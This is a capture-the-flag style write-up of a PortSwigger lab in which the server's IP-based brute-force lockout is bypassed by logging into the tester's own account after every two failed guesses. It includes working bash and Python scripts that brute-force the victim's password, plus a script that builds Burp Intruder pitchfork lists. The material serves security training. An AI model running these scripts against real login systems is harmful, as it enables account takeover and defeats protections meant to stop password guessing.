# Lab: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: carlos
- Candidate passwords
  
Hint: Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.

We made a test request:
![image](https://github.com/user-attachments/assets/1ed07196-7f9b-4aa3-8ce7-69f8e11af98c)

The server blocks us after three invalid login attempts:  
![image](https://github.com/user-attachments/assets/3c6cb504-9e7a-4381-b2de-80e7d1af445f)
**Note:** We know that the server is blocking our IP instead of the user because when we try with our user, we are still blocked:  
![image](https://github.com/user-attachments/assets/8cb0294a-c78d-4632-8b23-ae7fa5870943)

We realize manually that we can reset the counter to 0 by logging in with our credentials before the server blocks us:
![image](https://github.com/user-attachments/assets/d1562628-de39-49bf-a63b-3df16764f112)

We created the following script that performs a password brute force attack, resetting the server's counter to zero whenever 2 failed login attempts are reached:
```bash
#!/bin/bash

url="https://0a40005e033f387d8000fdfe00aa000e.web-security-academy.net/login"
passwords=("123456" "password" "12345678" "qwerty" "123456789" "12345" "1234" "111111" "1234567" "dragon"
           "123123" "baseball" "abc123" "football" "monkey" "letmein" "shadow" "master" "666666" "qwertyuiop"
           "123321" "mustang" "1234567890" "michael" "654321" "superman" "1qaz2wsx" "7777777" "121212" "000000"
           "qazwsx" "123qwe" "killer" "trustno1" "jordan" "jennifer" "zxcvbnm" "asdfgh" "hunter" "buster"
           "soccer" "harley" "batman" "andrew" "tigger" "sunshine" "iloveyou" "2000" "charlie" "robert"
           "thomas" "hockey" "ranger" "daniel" "starwars" "klaster" "112233" "george" "computer" "michelle"
           "jessica" "pepper" "1111" "zxcvbn" "555555" "11111111" "131313" "freedom" "777777" "pass"
           "maggie" "159753" "aaaaaa" "ginger" "princess" "joshua" "cheese" "amanda" "summer" "love"
           "ashley" "nicole" "chelsea" "biteme" "matthew" "access" "yankees" "987654321" "dallas" "austin"
           "thunder" "taylor" "matrix" "mobilemail" "mom" "monitor" "monitoring" "montana" "moon" "moscow")
   
reset_username="wiener"
reset_password="peter"

fail_count=0

for ((i=0; i<${#passwords[@]}; i++)); do
  password="${passwords[i]}" 

 
  full_response=$(curl -s -X POST "$url" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=carlos&password=$password")

 
  if [[ ! "$full_response" =~ "Incorrect password" ]]; then
    echo "Successful login for password: $password"
  fi


  if [[ "$full_response" =~ "Incorrect password" ]]; then
    fail_count=$((fail_count + 1))
  else
    fail_count=0  
  fi

 
  if [[ $fail_count -ge 2 ]]; then
    curl -s -X POST "$url" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$reset_username&password=$reset_password" > /dev/null
  fi
done
```
We executed the script and obtained the password:
![image](https://github.com/user-attachments/assets/298304e6-0291-42b9-949b-3c8a14c7d835)

We could also to create the following python scrypt:
```python
#!/usr/bin/env python3
import requests


url = "https://0a3a003203e8cf79812b751500770071.web-security-academy.net/login"
own_username = "wiener"
own_password = "peter"
fail_count = 0

with open('passwords.txt', 'r') as f:
    passwords =  [line.strip() for line in f.readlines()]

for password in passwords:
    data = {
            'username': "carlos",
            'password': password
            }
    r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    full_response = r.text

    if "Incorrect password" not in full_response:
        print(f"Successful login for password: {password}")
        break
    else:
        fail_count += 1
        
    if fail_count == 2:
        data = {
                'username': own_username,
                'password': own_password
                }
        r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        fail_count = 0
```

We could also have used a Burp Suite Intruder Pitchfork Attack by generating the lists (correct credentials every 2 incorrect ones). We will regenerate the lab and proceed to solve it this way.
```python
#!/usr/bin/env python3

print("------ Lista users -----")
for i in range(150):
    if i % 3 == 0 or i % 3 == 1:
        print("carlos")
    else:
        print("wiener")


print("------------------------------------------")
print("----- Lista passwords -----")

with open('passwords.txt', 'r') as f:
    lines =  f.readlines()

i = 0 

for passwd in lines:
    if i % 3 == 0 or i% 3 == 1:
        print(passwd.strip())
    else:
        print('peter')
    i += 1

```

We performed the Pitchfork Attack with Burp Suite Intruder, configuring both payloads with the generated lists:
![image](https://github.com/user-attachments/assets/20630434-b69d-4fdf-92c1-3dd86d40a363)

We log in and complete the lab:
![image](https://github.com/user-attachments/assets/74d0ab86-86dd-4238-a1ca-7b63b2569b87)
